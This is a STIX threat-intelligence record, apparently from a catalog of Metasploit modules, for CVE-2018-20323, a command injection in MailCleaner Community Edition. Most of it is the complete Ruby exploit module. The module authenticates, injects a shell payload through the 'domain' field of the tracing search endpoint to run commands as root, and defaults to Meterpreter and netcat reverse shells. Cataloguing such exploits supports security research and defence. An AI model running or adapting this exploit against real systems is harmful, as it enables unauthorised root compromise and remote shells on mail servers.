{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--00cb2c6e-81b2-49a6-a039-ee0b266d4fd5",
    "created": "2024-08-14T17:03:37.402899Z",
    "modified": "2024-08-14T17:03:37.402903Z",
    "name": "\"Mailcleaner Remote Code Execution\"",
    "description": " This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an operating system command under the context of the web server user which is root.  /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/http/mailcleaner_exec.rb",
            "external_id": "mailcleaner_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://pentest.blog/advisory-mailcleaner-community-edition-remote-code-execution/"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-20323"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Mailcleaner Remote Code Execution\",\n      'Description'    => %q{\n        This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an\n        operating system command under the context of the web server user which is root.\n\n        /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing\n        operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Mehmet Ince <mehmet@mehmetince.net>' # author & msf module\n        ],\n      'References'     =>\n        [\n          ['URL', 'https://pentest.blog/advisory-mailcleaner-community-edition-remote-code-execution/'],\n          ['CVE', '2018-20323']\n        ],\n      'DefaultOptions'  =>\n        {\n          'SSL' => true,\n          'WfsDelay' => 5,\n        },\n      'Platform'       => ['python', 'unix'],\n      'Arch'           => [ ARCH_PYTHON, ARCH_CMD ],\n      'Targets'        =>\n        [\n          ['Python payload',\n            {\n              'Platform' => 'python',\n              'Arch' => ARCH_PYTHON,\n              'DefaultOptions' => {'PAYLOAD'  => 'python/meterpreter/reverse_tcp'}\n            }\n          ],\n          ['Command payload',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'Payload' => {'BadChars' => \"\\x26\"},\n              'DefaultOptions' => {'PAYLOAD'  => 'cmd/unix/reverse_netcat'}\n            }\n          ]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2018-12-19',\n      'DefaultTarget'  => 0\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptString.new('TARGETURI', [true, 'The URI of the vulnerable instance', '/']),\n        OptString.new('USERNAME', [true, 'The username to login as']),\n        OptString.new('PASSWORD', [true, 'The password to login with'])\n      ]\n    )\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def password\n    datastore['PASSWORD']\n  end\n\n  def auth\n    print_status('Performing authentication...')\n\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'admin/')\n    })\n\n    if res && !res.get_cookies.empty?\n      cookie = res.get_cookies\n    else\n      fail_with(Failure::UnexpectedReply, 'Did not get cookie-set header from response.')\n    end\n\n    # Performing authentication\n    res = send_request_cgi({\n      'method'    => 'POST',\n      'uri'       => normalize_uri(target_uri.path, 'admin/'),\n      'cookie'    => cookie,\n      'vars_post' => {\n        'username'  => username,\n        'password' => password,\n        'submit' => 'Log+in'\n      }\n    })\n\n    if res && res.code == 302\n      print_good(\"Awesome..! Authenticated with #{username}:#{password}\")\n    else\n      fail_with(Failure::NoAccess, 'Credentials are not valid.')\n    end\n\n    cookie\n  end\n\n  def exploit\n    cookie = auth\n\n    if cookie.nil?\n      fail_with(Failure::Unknown, 'Something went wrong!')\n    end\n\n    print_status('Exploiting command injection flaw')\n\n    if target['Arch'] == ARCH_PYTHON\n      cmd = \"';$(python -c \\\"#{payload.encoded}\\\");#\"\n    else\n      cmd = \"';#{payload.encoded};#\"\n    end\n\n    send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path, 'admin', 'managetracing', 'search', 'search'),\n      'cookie'    => cookie,\n      'vars_post' => {\n        'search' => rand_text_alpha(5),\n        'domain' => cmd,\n        'submit' => 1\n      }\n    })\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-12-19",
    "x_mitre_platforms": [
        "unix'"
    ]
}